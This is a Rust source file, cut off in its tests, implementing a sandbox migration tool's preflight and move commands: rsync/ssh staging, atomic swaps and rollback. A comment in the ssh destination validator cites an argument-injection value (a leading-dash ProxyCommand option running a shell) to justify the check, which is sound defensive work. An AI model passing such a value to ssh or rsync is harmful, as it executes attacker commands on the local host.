//! `tup preflight` / `tup move` — the between-turn migration: quiesce the source, ship the
//! rw root (+ services + net) over rsync/ssh, and bring it up on the target.

use crate::net::read_net_label;
use crate::nixenv;
use crate::project::project_dir;
use crate::up::{find_init_pid, poll_init_pid};
use std::env;
use std::fs;
use std::fs::File;
use std::io;
use std::os::unix::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::{exit, Command, Stdio};
use std::time::Duration;

fn dir_size(p: &Path) -> u64 {
    let mut total = 0;
    if let Ok(rd) = fs::read_dir(p) {
        for e in rd.flatten() {
            match e.file_type() {
                Ok(ft) if ft.is_dir() => total += dir_size(&e.path()),
                Ok(ft) if ft.is_file() => {
                    if let Ok(m) = e.metadata() {
                        total += m.len();
                    }
                }
                _ => {}
            }
        }
    }
    total
}

fn human(bytes: u64) -> String {
    const U: [&str; 5] = ["B", "KiB", "MiB", "GiB", "TiB"];
    let mut v = bytes as f64;
    let mut i = 0;
    while v >= 1024.0 && i < U.len() - 1 {
        v /= 1024.0;
        i += 1;
    }
    if i == 0 {
        format!("{bytes} {}", U[0])
    } else {
        format!("{v:.1} {}", U[i])
    }
}

/// Report what a move would ship or lose. Honest about the current limits.
fn preflight_report(project: &str) {
    let root = project_dir(project).join("root");
    if !root.exists() {
        eprintln!(
            "[preflight] project '{project}' has no root at {}",
            root.display()
        );
        exit(1);
    }
    let bytes = dir_size(&root);
    let running = find_init_pid(project).is_some();
    eprintln!("[preflight] project={project}");
    eprintln!(
        "  running   : {}",
        if running {
            "yes — will be quiesced at the move boundary"
        } else {
            "no"
        }
    );
    eprintln!(
        "  payload   : {} ({bytes} bytes)  {}",
        human(bytes),
        root.display()
    );
    // Nix env: the closure ships by hash (nix copy / cache), not as raw bytes.
    if nixenv::is_nix_project(project) {
        match nixenv::profile_path(project) {
            Some(p) => eprintln!("  env       : nix — closure ships by hash: {}", p.display()),
            None => eprintln!("  env       : nix — not yet built; target rebuilds from the flake"),
        }
    } else {
        eprintln!("  env       : host /usr (inherited on the target, not shipped)");
    }
    // Persist volumes ride the payload as mutable bytes.
    let persist = project_dir(project).join("persist");
    if persist.exists() {
        let pb = dir_size(&persist);
        eprintln!("  persist   : {} ({pb} bytes)  {}", human(pb), persist.display());
    }
    // Host binds declared in the flake pin the project to paths that must exist on the target.
    let cfg = nixenv::read_tup_config(project);
    if cfg.binds.is_empty() {
        eprintln!("  host-pins : none");
    } else {
        eprintln!(
            "  host-pins : {} bind(s) — won't move unless the target has these paths:",
            cfg.binds.len()
        );
        for b in &cfg.binds {
            eprintln!("              {} {}", if b.ro { "ro" } else { "rw" }, b.src.display());
        }
    }
    // Move dial: derived/cache dirs a remote move rebuilds on the target instead of shipping.
    let excludes = payload_excludes(project, false);
    if excludes.is_empty() {
        eprintln!("  move-dial : --ship-all or move.ship covers everything; the full tree ships");
    } else {
        let (matched, saved) = rebuild_savings(&root, &excludes);
        eprintln!(
            "  rebuild   : {} pattern(s) not shipped over the wire (target rebuilds): {}",
            excludes.len(),
            excludes.join(" ")
        );
        if matched.is_empty() {
            eprintln!("              none present in this tree — full payload ships");
        } else {
            for (name, sz) in &matched {
                eprintln!("              {name}  ({})", human(*sz));
            }
            eprintln!(
                "              ≈ {} saved; ≈ {} ships over the wire (`--ship-all` to send all)",
                human(saved),
                human(bytes.saturating_sub(saved))
            );
        }
    }
    eprintln!(
        "  undeclared: enumerated at quiesce — stop hooks run, then survivors get SIGTERM then SIGKILL"
    );
    eprintln!(
        "  caches    : reachability from the target is not checked here; a cold cache makes resume honest-but-slow"
    );
}

/// Estimate the move dial's effect: top-level working-tree entries whose name matches an exclude
/// pattern, with their sizes, and the total bytes thus kept off the wire. Top-level only, so it's
/// an approximation (a `node_modules` nested in a monorepo subdir isn't counted here).
fn rebuild_savings(root: &Path, excludes: &[String]) -> (Vec<(String, u64)>, u64) {
    let tokens: Vec<&str> = excludes
        .iter()
        .filter(|p| !p.contains('*'))
        .map(|p| p.trim_end_matches('/'))
        .collect();
    let mut matched = Vec::new();
    let mut saved = 0u64;
    if let Ok(rd) = std::fs::read_dir(root) {
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().into_owned();
            if tokens.iter().any(|t| *t == name) {
                let sz = if e.path().is_dir() {
                    dir_size(&e.path())
                } else {
                    e.metadata().map(|m| m.len()).unwrap_or(0)
                };
                saved += sz;
                matched.push((name, sz));
            }
        }
    }
    (matched, saved)
}

pub(crate) fn cmd_preflight(args: &[String]) {
    if args.is_empty() {
        eprintln!("usage: tup preflight <project>");
        exit(2);
    }
    crate::project::ensure_valid_name(&args[0]);
    preflight_report(&args[0]);
}

fn wait_for_gone(pid: i32, ms: u64) -> bool {
    let step = 50u64;
    let mut waited = 0u64;
    loop {
        if unsafe { libc::kill(pid, 0) } != 0 {
            return true; // ESRCH — process gone
        }
        if waited >= ms {
            return false;
        }
        std::thread::sleep(Duration::from_millis(step));
        waited += step;
    }
}

/// Spawn a process fully detached (own session, io to a log) so it survives us exiting.
fn spawn_detached(program: &Path, args: &[String], log: &Path) -> bool {
    let f = match File::create(log) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("tup: cannot create log {}: {e}", log.display());
            return false;
        }
    };
    let err = f.try_clone();
    let mut c = Command::new(program);
    c.args(args).stdin(Stdio::null()).stdout(Stdio::from(f));
    if let Ok(e) = err {
        c.stderr(Stdio::from(e));
    }
    unsafe {
        c.pre_exec(|| {
            libc::setsid();
            Ok(())
        });
    }
    c.spawn().is_ok()
}

/// rsync that returns the error instead of exiting — a staging failure rolls back (and restarts
/// the quiesced source) rather than aborting the process mid-move.
fn run_rsync_checked(args: &[String]) -> io::Result<()> {
    match Command::new("rsync").args(args).status() {
        Ok(s) if s.success() => Ok(()),
        Ok(s) => Err(io::Error::other(format!("rsync failed ({s})"))),
        Err(e) => Err(io::Error::new(
            e.kind(),
            format!("rsync error: {e} (is rsync installed?)"),
        )),
    }
}

/// Remove a file or directory tree if present; an absent path is success.
fn remove_any(p: &Path) -> io::Result<()> {
    if p.is_dir() {
        fs::remove_dir_all(p)
    } else if p.symlink_metadata().is_ok() {
        fs::remove_file(p)
    } else {
        Ok(())
    }
}

/// Extra `tup up` args so the target resumes with the same env mode as the source.
fn env_up_args(project: &str) -> Vec<String> {
    if nixenv::is_nix_project(project) {
        vec!["--env".to_string(), "nix".to_string()]
    } else {
        Vec::new()
    }
}

/// One component of a local move, staged for an atomic swap. `incoming` is a fully-built
/// replacement sitting beside the live path; `commit_swap` parks the old copy at `rollback` and
/// renames `incoming` into place (atomic on one filesystem). No component the resumed agent can
/// see changes until every component has staged cleanly, and any failure reverses.
struct Swap {
    live: PathBuf,
    incoming: PathBuf,
    rollback: PathBuf,
    had_live: bool,
    swapped: bool,
}

impl Swap {
    /// Park the live copy (if any) and move the staged copy into place.
    fn commit_swap(&mut self) -> io::Result<()> {
        if self.had_live {
            fs::rename(&self.live, &self.rollback)?;
        }
        if let Err(e) = fs::rename(&self.incoming, &self.live) {
            // Put the parked copy back so this component is left exactly as we found it.
            if self.had_live {
                let _ = fs::rename(&self.rollback, &self.live);
            }
            return Err(e);
        }
        self.swapped = true;
        Ok(())
    }

    /// Reverse a swap — or, if we never swapped, just drop the stage: discard the new payload and
    /// restore the parked copy.
    fn rollback(&self) -> io::Result<()> {
        if !self.swapped {
            return remove_any(&self.incoming);
        }
        remove_any(&self.live)?;
        if self.had_live {
            fs::rename(&self.rollback, &self.live)?;
        }
        Ok(())
    }

    /// On success: drop the parked old copy. From here the stopped source is the real rollback.
    fn commit_cleanup(&self) {
        if self.swapped && self.had_live {
            let _ = remove_any(&self.rollback);
        }
    }
}

/// Build `<dst>/<name>.incoming` as a fresh rsync of `<src>/<name>`. `--link-dest` points at the
/// current live copy so unchanged files hardlink (cheap) and the old tree stays intact for
/// rollback. Returns a staged (not yet swapped) `Swap`.
fn stage_dir_local(
    src_dir: &Path,
    dst_dir: &Path,
    name: &str,
    excludes: &[&str],
) -> io::Result<Swap> {
    let live = dst_dir.join(name);
    let incoming = dst_dir.join(format!("{name}.incoming"));
    let rollback = dst_dir.join(format!("{name}.rollback"));
    let had_live = live.exists();
    remove_any(&incoming)?; // clear any stale stage left by an aborted prior move
    let _ = remove_any(&rollback);
    fs::create_dir_all(&incoming)?;
    let s = format!("{}/", src_dir.join(name).display());
    let d = format!("{}/", incoming.display());
    let mut args: Vec<String> = vec!["-a".into(), "--delete".into()];
    if had_live {
        args.push("--link-dest".into());
        args.push(live.display().to_string());
    }
    for e in excludes {
        args.push("--exclude".into());
        args.push((*e).to_string());
    }
    args.push(s);
    args.push(d);
    if let Err(e) = run_rsync_checked(&args) {
        let _ = remove_any(&incoming);
        return Err(e);
    }
    Ok(Swap {
        live,
        incoming,
        rollback,
        had_live,
        swapped: false,
    })
}

/// Stage a small sibling file (`services`, `net`) as `<name>.incoming`, if present.
fn stage_file_local(src_dir: &Path, dst_dir: &Path, name: &str) -> io::Result<Option<Swap>> {
    let srcf = src_dir.join(name);
    if !srcf.exists() {
        return Ok(None);
    }
    let live = dst_dir.join(name);
    let incoming = dst_dir.join(format!("{name}.incoming"));
    let rollback = dst_dir.join(format!("{name}.rollback"));
    let had_live = live.exists();
    let _ = remove_any(&incoming);
    let _ = remove_any(&rollback);
    fs::copy(&srcf, &incoming)?;
    Ok(Some(Swap {
        live,
        incoming,
        rollback,
        had_live,
        swapped: false,
    }))
}

/// Bring a project back up with its own net + env mode, detached, and confirm it resumed. Used to
/// restore the source after a move fails past the quiesce — the rollback the user actually feels.
fn restart_source(project: &str) {
    let exe = env::current_exe().unwrap_or_else(|_| PathBuf::from("tup"));
    let net = read_net_label(project);
    let log = project_dir(project).join("up.log");
    let mut a = vec!["up".to_string()];
    a.extend(env_up_args(project));
    a.push("--net".to_string());
    a.push(net);
    a.push(project.to_string());
    spawn_detached(&exe, &a, &log);
    match poll_init_pid(project, 150) {
        Some(p) => eprintln!("[tup] source '{project}' restarted (init pid {p})"),
        None => eprintln!(
            "[tup] WARNING: could not confirm source '{project}' restarted; see {} and run `tup up {project}`",
            log.display()
        ),
    }
}

/// Push the env closure to the target's store by hash — only paths it lacks transfer. The
/// move stays correct without it (the target rebuilds from the flake + its own cache), so a
/// failure is a warning, not a hard error.
fn nix_copy(dest: &str, profile: &Path) {
    eprintln!("[tup] nix copy env closure -> {dest} (by hash; only missing paths transfer)");
    let to = format!("ssh://{dest}");
    let r = Command::new("nix")
        .args([
            "copy",
            "--extra-experimental-features",
            "nix-command flakes",
            "--to",
            &to,
        ])
        .arg(profile)
        .status();
    match r {
        Ok(s) if s.success() => {}
        Ok(s) => eprintln!("[tup] warning: nix copy failed ({s}); target will rebuild from its cache"),
        Err(e) => {
            eprintln!("[tup] warning: nix unavailable for copy ({e}); target will rebuild from its cache")
        }
    }
}

pub(crate) fn cmd_move(args: &[String]) {
    let mut force = false;
    let mut ship_all = false;
    let mut pos: Vec<&String> = Vec::new();
    for a in args {
        match a.as_str() {
            "--force" => force = true,
            "--ship-all" => ship_all = true,
            _ => pos.push(a),
        }
    }
    if pos.len() < 2 {
        eprintln!(
            "usage: tup move [--force] [--ship-all] <project> <local:<newproject> | [user@]host>"
        );
        exit(2);
    }
    let project = pos[0].as_str();
    let dest = pos[1].as_str();
    // Validate BOTH the project name and the destination up front — before preflight or the
    // quiesce below touches anything — so a bad value can't kill the source and then abort, and
    // can never reach a path or a shell/ssh argument. (local_move/remote_move re-check, so they
    // stay self-guarding.)
    crate::project::ensure_valid_name(project);
    match dest.strip_prefix("local:") {
        Some(newproj) => crate::project::ensure_valid_name(newproj),
        None => validate_dest(dest),
    }

    preflight_report(project);

    // Check everything that does NOT require the source to be stopped BEFORE we quiesce it, so a
    // busy or already-taken destination aborts without ever interrupting the running agent.
    match dest.strip_prefix("local:") {
        Some(newproj) => precheck_local(project, newproj, force),
        None => precheck_remote(dest, project, force),
    }

    // Quiesce the source at the (simulated) turn boundary so stop hooks flush state into the root
    // and we ship a STATIC tree. From here the move is all-or-nothing: any failure restores the
    // destination to exactly what it was and restarts the source.
    quiesce_source(project);

    match dest.strip_prefix("local:") {
        // A local move hardlinks via rsync --link-dest, so shipping the full tree is nearly free;
        // the rebuild-vs-rsync dial only pays off over the wire, so it applies to remote moves.
        Some(newproj) => local_move(project, newproj),
        None => remote_move(project, dest, ship_all),
    }
}

/// Derived/cache dirs left OUT of the move payload by default — the target rebuilds or refetches
/// them (cheaper than shipping gigabytes over ssh when the caches are networked). Overridable per
/// project via `outputs.tup.move.{ship,rebuild}` and globally by `tup move --ship-all`. These are
/// rsync filter patterns matched against the working tree at any depth (monorepo-friendly).
const DEFAULT_REBUILD: &[&str] = &[
    "target/",
    "node_modules/",
    ".venv/",
    "venv/",
    "__pycache__/",
    "*.pyc",
    ".mypy_cache/",
    ".pytest_cache/",
    ".ruff_cache/",
    ".cache/",
    "dist/",
    "build/",
    ".next/",
    ".turbo/",
    ".parcel-cache/",
];

/// Normalize a user move-path (`/work/x`, `x/`, `/x`) to a bare dir token (`x`) so it can be
/// matched against [`DEFAULT_REBUILD`] basenames.
fn move_token(p: &str) -> String {
    let p = p.trim();
    let p = p.strip_prefix("/work/").unwrap_or(p);
    p.trim_matches('/').to_string()
}

/// The rsync exclude patterns for the working-tree payload: the built-in derived-dir defaults
/// plus the flake's `move.rebuild`, minus anything the flake's `move.ship` asks to keep. Empty
/// when `ship_all`.
fn payload_excludes(project: &str, ship_all: bool) -> Vec<String> {
    let pol = nixenv::read_move_policy(project);
    compute_excludes(&pol.ship, &pol.rebuild, ship_all)
}

/// Pure core of the move dial: fold the built-in defaults with the flake's `ship`/`rebuild`.
/// `ship` removes a default (keep it in the payload); `rebuild` adds a pattern; `ship_all` wins.
fn compute_excludes(ship: &[String], rebuild: &[String], ship_all: bool) -> Vec<String> {
    if ship_all {
        return Vec::new();
    }
    let shipped: Vec<String> = ship.iter().map(|s| move_token(s)).collect();
    let mut pats: Vec<String> = Vec::new();
    for d in DEFAULT_REBUILD {
        let tok = d.trim_end_matches('/');
        if !shipped.iter().any(|s| s == tok) {
            pats.push((*d).to_string());
        }
    }
    for r in rebuild {
        let tok = move_token(r);
        if tok.is_empty() || pats.iter().any(|p| p.trim_end_matches('/') == tok) {
            continue;
        }
        pats.push(if tok.contains('*') {
            tok
        } else {
            format!("{tok}/")
        });
    }
    pats
}

/// Stop the source (SIGTERM, then SIGKILL after 10s) and wait for PID 1 to be gone.
fn quiesce_source(project: &str) {
    if let Some(pid) = find_init_pid(project) {
        eprintln!("[tup] quiescing source (init pid {pid})");
        unsafe { libc::kill(pid, libc::SIGTERM) };
        if !wait_for_gone(pid, 10_000) {
            eprintln!("[tup] source still running after 10s; SIGKILL so we ship a static tree");
            unsafe { libc::kill(pid, libc::SIGKILL) };
            let _ = wait_for_gone(pid, 3_000);
        }
    } else {
        eprintln!("[tup] source not running; shipping current on-disk state");
    }
}

/// Local-destination preconditions (run before the quiesce, so these exits leave the source up).
fn precheck_local(project: &str, newproj: &str, force: bool) {
    crate::project::ensure_valid_name(newproj);
    if newproj == project {
        eprintln!("tup: source and destination are the same project");
        exit(2);
    }
    if find_init_pid(newproj).is_some() {
        eprintln!("tup: destination '{newproj}' is running — stop it first");
        exit(1);
    }
    if !force && project_dir(newproj).join("root").exists() {
        eprintln!(
            "tup: destination project '{newproj}' already exists — refusing to overwrite its working tree/persist (pass --force to replace)"
        );
        exit(1);
    }
}

/// Remote-destination preconditions (also run before the quiesce).
fn precheck_remote(dest: &str, project: &str, force: bool) {
    validate_dest(dest);
    match remote_running(dest, project) {
        Some(true) => {
            eprintln!("tup: '{project}' is already running on {dest} — stop it there first");
            exit(1);
        }
        None => {
            eprintln!(
                "tup: couldn't determine whether '{project}' is running on {dest} (ssh/pgrep failed); aborting rather than risk overwriting a live working tree"
            );
            exit(1);
        }
        Some(false) => {}
    }
    if !force && remote_exists(dest, &format!(".tup/{project}/root")) {
        eprintln!(
            "tup: destination '{dest}' already has project '{project}' — refusing to overwrite (pass --force to replace)"
        );
        exit(1);
    }
}

fn local_move(project: &str, newproj: &str) {
    let src_dir = project_dir(project);
    let dst_dir = project_dir(newproj);
    let _ = fs::create_dir_all(&dst_dir);

    // Stage every component beside its live path. Nothing a resumed agent could see changes until
    // all of them have staged cleanly, so a staging failure leaves the destination untouched.
    let mut swaps: Vec<Swap> = Vec::new();
    match stage_dir_local(&src_dir, &dst_dir, "root", &[]) {
        Ok(s) => swaps.push(s),
        Err(e) => return stage_failed_local(project, &swaps, &format!("root: {e}")),
    }
    if src_dir.join("persist").exists() {
        match stage_dir_local(&src_dir, &dst_dir, "persist", &[]) {
            Ok(s) => swaps.push(s),
            Err(e) => return stage_failed_local(project, &swaps, &format!("persist: {e}")),
        }
    }
    if src_dir.join("env").exists() {
        match stage_dir_local(&src_dir, &dst_dir, "env", &["profile", "etc"]) {
            Ok(s) => swaps.push(s),
            Err(e) => return stage_failed_local(project, &swaps, &format!("env: {e}")),
        }
    }
    for f in ["services", "net"] {
        match stage_file_local(&src_dir, &dst_dir, f) {
            Ok(Some(s)) => swaps.push(s),
            Ok(None) => {}
            Err(e) => return stage_failed_local(project, &swaps, &format!("{f}: {e}")),
        }
    }

    // Commit the swaps (each: park live -> .rollback, rename .incoming -> live). If one fails,
    // reverse the committed ones and drop the still-staged ones, then restart the source.
    for i in 0..swaps.len() {
        if let Err(e) = swaps[i].commit_swap() {
            for j in (0..i).rev() {
                let _ = swaps[j].rollback();
            }
            for s in &swaps[i + 1..] {
                let _ = s.rollback();
            }
            restart_source(project);
            eprintln!(
                "tup: move aborted while swapping in the new payload ({e}); destination restored, source '{project}' restarted"
            );
            exit(1);
        }
    }

    let net = read_net_label(project);
    eprintln!("[tup] shipped root: {project} -> {newproj} (net={net})");

    // Bring the target up with the SAME net + env mode and confirm it resumed — the commit point.
    let exe = env::current_exe().unwrap_or_else(|_| PathBuf::from("tup"));
    let log = dst_dir.join("up.log");
    let mut up_args = vec!["up".to_string()];
    up_args.extend(env_up_args(newproj));
    up_args.push("--net".to_string());
    up_args.push(net);
    up_args.push(newproj.to_string());
    spawn_detached(&exe, &up_args, &log);

    match poll_init_pid(newproj, 150) {
        Some(p) => {
            for s in &swaps {
                s.commit_cleanup(); // drop the parked copies; the stopped source is the rollback now
            }
            eprintln!(
                "[tup] resumed as '{newproj}' (init pid {p}); log {}",
                log.display()
            );
            eprintln!(
                "[tup] source '{project}' left stopped as a rollback copy — `tup up {project}` to undo, `tup rm {project}` to reclaim"
            );
        }
        None => {
            for s in swaps.iter().rev() {
                let _ = s.rollback();
            }
            restart_source(project);
            eprintln!(
                "[tup] '{newproj}' did not come up (see {}); rolled back — destination restored, source '{project}' restarted",
                log.display()
            );
            exit(1);
        }
    }
}

/// A staging failure happens before any swap, so the destination is still untouched: drop the
/// half-built stages and restart the quiesced source.
fn stage_failed_local(project: &str, swaps: &[Swap], what: &str) {
    for s in swaps {
        let _ = s.rollback(); // nothing swapped yet -> removes the .incoming stage
    }
    restart_source(project);
    eprintln!("tup: staging {what}; destination untouched, source '{project}' restarted");
    exit(1);
}

/// Remote liveness of the project's init. `Some(true)`/`Some(false)` only when pgrep ran and
/// gave a definite answer; `None` when we CAN'T tell (ssh/connection error, pgrep missing).
/// The caller must treat `None` as "do not proceed" — a false "not running" would let a later
/// `rsync --delete` wipe a live remote working tree.
fn remote_running(dest: &str, project: &str) -> Option<bool> {
    // `project` is validated by the caller, so it is safe inside the single-quoted pattern.
    match Command::new("ssh")
        .arg(dest)
        .arg(format!("pgrep -f '/run/tup init {project}' >/dev/null 2>&1"))
        .status()
    {
        Ok(s) => match s.code() {
            Some(0) => Some(true),  // pgrep matched → running
            Some(1) => Some(false), // pgrep ran, matched nothing → not running
            _ => None,              // 255 (ssh error), 127 (no pgrep), signalled, …
        },
        Err(_) => None, // couldn't even spawn ssh
    }
}

/// A remote component staged as `<name>.incoming`, with whether a live copy already existed (so
/// rollback knows whether to restore a parked copy or just delete what we added).
struct RStage {
    name: &'static str,
    had_live: bool,
}

fn remote_move(project: &str, dest: &str, ship_all: bool) {
    // Ship to ~/.tup/<project> on the remote (rsync remote paths are relative to $HOME). The
    // destination's live tree is never touched until every component has staged as `.incoming`
    // and the whole set swaps in at once; any failure rolls back and restarts the local source.
    let src_dir = project_dir(project);
    let base = format!(".tup/{project}");
    if !ssh(dest, &format!("mkdir -p {base}")) {
        restart_source(project);
        eprintln!("tup: couldn't prepare {dest}:{base}; nothing shipped, source '{project}' restarted");
        exit(1);
    }

    // The move dial: derived/cache dirs are left out of the working-tree payload so the target
    // rebuilds them, unless --ship-all or the flake's move.ship overrides. Only the `root`
    // component is filtered; persist/env/services/net always ship in full.
    let root_excludes = payload_excludes(project, ship_all);
    let root_ex_refs: Vec<&str> = root_excludes.iter().map(String::as_str).collect();
    if !root_excludes.is_empty() {
        eprintln!(
            "[tup] move dial: not shipping {} derived path pattern(s) (target rebuilds): {}",
            root_excludes.len(),
            root_excludes.join(" ")
        );
    }

    // (name, is_dir, excludes). env excludes the realised profile/etc (rebuilt from the flake).
    let comps: [(&str, bool, &[&str]); 5] = [
        ("root", true, &[]),
        ("persist", true, &[]),
        ("env", true, &["profile", "etc"]),
        ("services", false, &[]),
        ("net", false, &[]),
    ];
    let mut staged: Vec<RStage> = Vec::new();
    for (name, is_dir, excl) in comps {
        if !src_dir.join(name).exists() {
            continue;
        }
        // The working tree carries the move dial's excludes; every other component ships whole.
        let excl: &[&str] = if name == "root" { &root_ex_refs } else { excl };
        let had_live = remote_exists(dest, &format!("{base}/{name}"));
        let ok = if is_dir {
            stage_dir_remote(dest, &base, &src_dir, name, excl, had_live)
        } else {
            stage_file_remote(dest, &base, &src_dir, name)
        };
        if !ok {
            remote_cleanup_incoming(dest, &base, &staged);
            let _ = ssh(dest, &format!("rm -rf {base}/{name}.incoming"));
            restart_source(project);
            eprintln!(
                "tup: staging '{name}' to {dest} failed; destination untouched, source '{project}' restarted"
            );
            exit(1);
        }
        staged.push(RStage { name, had_live });
    }

    // Push the env closure by hash before the swap (best-effort; the target can rebuild otherwise).
    if nixenv::is_nix_project(project) {
        if let Some(profile) = nixenv::profile_path(project) {
            nix_copy(dest, &profile);
        }
    }

    // Swap every staged component in on the remote in one shot.
    if !ssh(dest, &remote_swap_script(&base, &staged)) {
        let _ = ssh(dest, &remote_rollback_script(&base, &staged));
        restart_source(project);
        eprintln!("tup: swap on {dest} failed; attempted rollback, source '{project}' restarted");
        exit(1);
    }

    let net = read_net_label(project);
    eprintln!("[tup] shipped root: {project} -> {dest} (net={net})");

    let envflag = if nixenv::is_nix_project(project) {
        "--env nix "
    } else {
        ""
    };
    let up = format!(
        "setsid nohup tup up {envflag}--net {net} {project} > {base}/up.log 2>&1 < /dev/null &"
    );
    let _ = ssh(dest, &up);

    // Confirm the target actually came up; otherwise roll the remote back and restart the source.
    if confirm_remote_up(dest, project) {
        let _ = ssh(dest, &remote_commit_script(&base, &staged));
        eprintln!(
            "[tup] resumed '{project}' on {dest}; source '{project}' left stopped as a rollback copy (`tup up {project}` to undo)"
        );
    } else {
        let _ = ssh(dest, &remote_rollback_script(&base, &staged));
        restart_source(project);
        eprintln!(
            "[tup] '{project}' did not come up on {dest}; rolled back the remote and restarted the source. Inspect: ssh {dest} cat {base}/up.log"
        );
        exit(1);
    }
}

/// Stage a remote directory as `<name>.incoming`. `--link-dest=../<name>` (relative to the
/// receiving dir) hardlinks unchanged files to the live copy, keeping it intact for rollback.
fn stage_dir_remote(
    dest: &str,
    base: &str,
    src_dir: &Path,
    name: &str,
    excludes: &[&str],
    had_live: bool,
) -> bool {
    if !ssh(dest, &format!("rm -rf {base}/{name}.incoming")) {
        return false;
    }
    let s = format!("{}/", src_dir.join(name).display());
    let d = format!("{dest}:{base}/{name}.incoming/");
    let mut args: Vec<String> = vec!["-a".into(), "--delete".into(), "-e".into(), "ssh".into()];
    if had_live {
        args.push("--link-dest".into());
        args.push(format!("../{name}"));
    }
    for e in excludes {
        args.push("--exclude".into());
        args.push((*e).to_string());
    }
    args.push(s);
    args.push(d);
    run_rsync_checked(&args).is_ok()
}

/// Stage a small remote file (`services`, `net`) as `<name>.incoming`.
fn stage_file_remote(dest: &str, base: &str, src_dir: &Path, name: &str) -> bool {
    let srcf = src_dir.join(name);
    let Some(sp) = srcf.to_str() else {
        return false;
    };
    let _ = ssh(dest, &format!("rm -f {base}/{name}.incoming"));
    let args: Vec<String> = vec![
        "-a".into(),
        "-e".into(),
        "ssh".into(),
        sp.to_string(),
        format!("{dest}:{base}/{name}.incoming"),
    ];
    run_rsync_checked(&args).is_ok()
}

/// Swap staged `.incoming` copies into place: park any live copy at `.rollback`, then move
/// `.incoming` over it. `set -e` so a mid-swap failure stops and the caller rolls back. Component
/// names come from a fixed allowlist and `base` holds a validated project name — no injection.
fn remote_swap_script(base: &str, staged: &[RStage]) -> String {
    let mut s = format!("set -e; cd {base}");
    for c in staged {
        let n = c.name;
        s.push_str(&format!(
            "; if [ -e {n} ]; then mv {n} {n}.rollback; fi; mv {n}.incoming {n}"
        ));
    }
    s
}

/// Undo a swap (or drop a half-done one): restore parked copies, remove anything we added, and
/// clear leftover stages. Best-effort — it never fails the shell.
fn remote_rollback_script(base: &str, staged: &[RStage]) -> String {
    let mut s = format!("cd {base} || exit 0");
    for c in staged {
        let n = c.name;
        if c.had_live {
            s.push_str(&format!(
                "; if [ -e {n}.rollback ]; then rm -rf {n}; mv {n}.rollback {n}; fi"
            ));
        } else {
            s.push_str(&format!("; rm -rf {n}")); // nothing was there before: remove what we added
        }
        s.push_str(&format!("; rm -rf {n}.incoming"));
    }
    s
}

/// On success: drop the parked old copies on the remote.
fn remote_commit_script(base: &str, staged: &[RStage]) -> String {
    let mut s = format!("cd {base} || exit 0");
    for c in staged {
        s.push_str(&format!("; rm -rf {}.rollback", c.name));
    }
    s
}

/// Remove already-staged `.incoming` dirs after a staging failure (destination still untouched).
fn remote_cleanup_incoming(dest: &str, base: &str, staged: &[RStage]) {
    for c in staged {
        let _ = ssh(dest, &format!("rm -rf {base}/{}.incoming", c.name));
    }
}

/// Poll the remote for the resumed init, a few times, before declaring the move committed.
fn confirm_remote_up(dest: &str, project: &str) -> bool {
    for _ in 0..10 {
        if remote_running(dest, project) == Some(true) {
            return true;
        }
        std::thread::sleep(Duration::from_millis(300));
    }
    false
}

/// Validate an ssh destination before it reaches ssh/rsync as a positional argument. The
/// critical rule is "no leading '-'": ssh and rsync parse a leading-dash argument as an
/// OPTION, so a dest like `-oProxyCommand=sh -c '…'` would execute a command on the LOCAL
/// host before any connection. We also keep the charset tight ([user@]host); for a port, an
/// IPv6 literal, or an ssh:// URL, use an ssh config alias (which fits this charset).
fn dest_is_valid(dest: &str) -> bool {
    !dest.is_empty()
        && !dest.starts_with('-')
        && dest
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@'))
}

fn validate_dest(dest: &str) {
    if !dest_is_valid(dest) {
        eprintln!(
            "tup: invalid destination '{dest}' — expected [user@]host (letters, digits, '.', '_', '-', '@'; no leading '-'). For a port/IPv6/ssh:// target, use an ssh config alias."
        );
        exit(2);
    }
}

fn ssh(dest: &str, cmd: &str) -> bool {
    match Command::new("ssh").arg(dest).arg(cmd).status() {
        Ok(s) if s.success() => true,
        Ok(s) => {
            eprintln!("[tup] ssh {dest} failed ({s}): {cmd}");
            false
        }
        Err(e) => {
            eprintln!("[tup] ssh error: {e}");
            false
        }
    }
}

/// Does `path` (relative to the remote home) exist on `dest`? Only `true` when the check ran and
/// the path is there — an absent path (`test` exits 1) or an ssh error maps to `false`, without
/// the failure log that `ssh()` would print for a normal "absent" result.
fn remote_exists(dest: &str, path: &str) -> bool {
    matches!(
        Command::new("ssh")
            .arg(dest)
            .arg(format!("test -e {path}"))
            .status()
            .map(|s| s.code()),
        Ok(Some(0))
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmpdir() -> PathBuf {
        let p = std::env::temp_dir().join(format!(
            "tup-mv-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        fs::create_dir_all(&p).unwrap();
        p
    }

    fn swap_for(base: &Path, name: &str, had_live: bool) -> Swap {
        Swap {
            live: base.join(name),
            incoming: base.join(format!("{name}.incoming")),
            rollback: base.join(format!("{name}.rollback")),
            had_live,
            swapped: false,
        }
    }

    #[test]
    fn local_swap_commit_then_cleanup_keeps_new_drops_old() {
        let base = tmpdir();
        let live = base.join("root");
        fs::create_dir_all(&live).unwrap();
        fs::write(live.join("f"), b"old").unwrap();
        let incoming = base.join("root.incoming");
        fs::create_dir_all(&incoming).unwrap();
        fs::write(incoming.join("f"), b"new").unwrap();

        let mut sw = swap_for(&base, "root", true);
        sw.commit_swap().unwrap();
        assert_eq!(fs::read(live.join("f")).unwrap(), b"new"); // new payload is live
        assert!(base.join("root.rollback").join("f").exists()); // old parked
        assert!(!incoming.exists()); // stage consumed

        sw.commit_cleanup();
        assert!(!base.join("root.rollback").exists()); // parked copy dropped
        assert_eq!(fs::read(live.join("f")).unwrap(), b"new");
        fs::remove_dir_all(&base).ok();
    }

    #[test]
    fn local_swap_rollback_restores_old_payload() {
        let base = tmpdir();
        let live = base.join("root");
        fs::create_dir_all(&live).unwrap();
        fs::write(live.join("f"), b"old").unwrap();
        let incoming = base.join("root.incoming");
        fs::create_dir_all(&incoming).unwrap();
        fs::write(incoming.join("f"), b"new").unwrap();

        let mut sw = swap_for(&base, "root", true);
        sw.commit_swap().unwrap();
        sw.rollback().unwrap();

        assert_eq!(fs::read(live.join("f")).unwrap(), b"old"); // original restored
        assert!(!base.join("root.incoming").exists());
